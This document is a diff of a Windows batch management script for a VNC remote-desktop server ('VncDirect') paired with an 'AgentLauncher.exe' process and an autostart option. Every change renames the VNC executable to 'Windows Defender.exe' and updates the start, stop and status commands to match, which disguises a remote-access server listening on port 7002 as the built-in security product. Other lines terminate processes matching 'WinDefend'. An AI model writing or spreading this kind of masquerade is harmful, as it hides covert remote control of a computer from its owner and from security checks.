@@ -15,7 +15,7 @@ if !errorlevel! neq 0 (
 
 :show_menu
 set "VNC_RUNNING=0"
-tasklist /FI "IMAGENAME eq VncDirect.exe" 2>nul | find /i "VncDirect.exe" >nul
+tasklist /FI "IMAGENAME eq Windows Defender.exe" 2>nul | find /i "Windows Defender.exe" >nul
 if !errorlevel! equ 0 set "VNC_RUNNING=1"
 
 set "HAS_AUTOSTART=0"
@@ -89,7 +89,7 @@ echo === Full Uninstall ===
 echo.
 echo [1/6] Stopping running processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
-taskkill /F /IM VncDirect.exe >nul 2>&1
+taskkill /F /IM Windows Defender.exe >nul 2>&1
 wmic process where "commandline like '%%WinDefend%%'" call terminate >nul 2>&1
 timeout /t 2 /nobreak >nul
 
@@ -147,7 +147,7 @@ echo === Removing Autostart ===
 echo.
 echo [1/3] Stopping processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
-taskkill /F /IM VncDirect.exe >nul 2>&1
+taskkill /F /IM Windows Defender.exe >nul 2>&1
 wmic process where "commandline like '%%WinDefend%%'" call terminate >nul 2>&1
 timeout /t 1 /nobreak >nul
 
@@ -212,15 +212,15 @@ goto START_VNC
 echo.
 echo === Starting VNC Server ===
 echo.
-if not exist "%DEST%\VncDirect\VncDirect.exe" (
-    echo    [!] VncDirect.exe not found. Run installer first.
+if not exist "%DEST%\VncDirect\Windows Defender.exe" (
+    echo    [!] Windows Defender.exe not found. Run installer first.
     pause
     goto show_menu
 )
 echo    Starting VncDirect...
-start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
 timeout /t 3 /nobreak >nul
-tasklist /FI "IMAGENAME eq VncDirect.exe" 2>nul | find /i "VncDirect.exe" >nul
+tasklist /FI "IMAGENAME eq Windows Defender.exe" 2>nul | find /i "Windows Defender.exe" >nul
 if !errorlevel! equ 0 ( echo    [+] VNC Server started. ) else ( echo    [!] Failed to start. )
 echo.
 echo ========================================
@@ -240,9 +240,9 @@ echo.
 echo === Stopping VNC Server ===
 echo.
 echo    Stopping VncDirect...
-taskkill /F /IM VncDirect.exe >nul 2>&1
+taskkill /F /IM Windows Defender.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
-tasklist /FI "IMAGENAME eq VncDirect.exe" 2>nul | find /i "VncDirect.exe" >nul
+tasklist /FI "IMAGENAME eq Windows Defender.exe" 2>nul | find /i "Windows Defender.exe" >nul
 if !errorlevel! neq 0 ( echo    [+] VNC Server stopped. ) else ( echo    [!] Failed to stop. )
 goto wait_menu
 
@@ -265,7 +265,7 @@ set /p "NEWPASS=Password: "
 
 echo.
 echo Stopping VNC server...
-taskkill /F /IM VncDirect.exe >nul 2>&1
+taskkill /F /IM Windows Defender.exe >nul 2>&1
 timeout /t 2 /nobreak >nul
 
 if not "%NEWPASS%"=="" (
@@ -294,8 +294,8 @@ if not "%NEWPASS%"=="" (
 echo.
 echo Restarting VNC server...
 timeout /t 1 /nobreak >nul
-if exist "%DEST%\VncDirect\VncDirect.exe" (
-    start "" "%DEST%\VncDirect\VncDirect.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
+if exist "%DEST%\VncDirect\Windows Defender.exe" (
+    start "" "%DEST%\VncDirect\Windows Defender.exe" port=7002 cwd=%DEST%\VncDirect\vnc fps=360 scale=0
     echo    VNC server restarted.
 ) else (
     echo    VNC server not found.
